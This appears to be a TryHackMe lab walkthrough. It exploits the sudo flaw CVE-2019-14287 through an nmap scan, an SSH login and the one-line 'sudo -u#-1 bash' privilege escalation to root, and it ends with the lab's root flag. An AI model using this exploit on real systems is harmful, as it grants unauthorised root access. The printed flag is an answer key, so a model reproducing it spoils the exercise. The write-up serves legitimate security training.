# Walkthrough : TryHackMe - Sudo Security Bypass (CVE-2019-14287)
## Step 1: Network Reconnaissance
- An initial Nmap scan is executed against the target system (```10.48.168.214```) to identify open ports and services.
```bash
nmap -sV -sC -p- 10.48.168.214
```
- Findings:
  - Port ```2222/tcp```: OpenSSH 7.6p1
  - Port ```4444/tcp```: OpenSSH 7.6p1

## Step 2: SSH Access & Privilege Enumeration
- Authenticate to the host via SSH on port ```2222``` using the provided initial credentials (```tryhackme```).
```bash
ssh -p 2222 tryhackme@10.48.168.214
```
- Check sudo privileges allowed for the current user:
```bash
sudo -l
```
- Vulnerability Analysis:
  - The output displays: (```ALL, !root```) NOPASSWD: ```/bin/bash```
  - This configuration explicitly forbids running ```/bin/bash``` as ```root```, but allows executing it as any other user without requiring a password.
  - Because the installed ```sudo``` version is vulnerable to CVE-2019-14287, passing User ID ```-1``` or ```4294967295``` causes integer overflow inside the user ID evaluation functions, effectively evaluating ```-1``` as ```0``` (```root```).

## Step 3: Exploitation & Privilege Escalation
- Execute ```sudo``` using the ```-u#-1``` parameter to bypass the user restriction and launch ```/bin/bash``` directly as ```root```:
```bash
sudo -u#-1 bash
```
- Verify the newly elevated context:
```bash
whoami
# Output: root
```
## Step 4: Flag Retrieval
- Navigate to the root user directory and display the root flag:
```bash
cd /root
cat root.txt
```
- Root Flag: ```THM{l33t_s3cur1ty_bypass}```
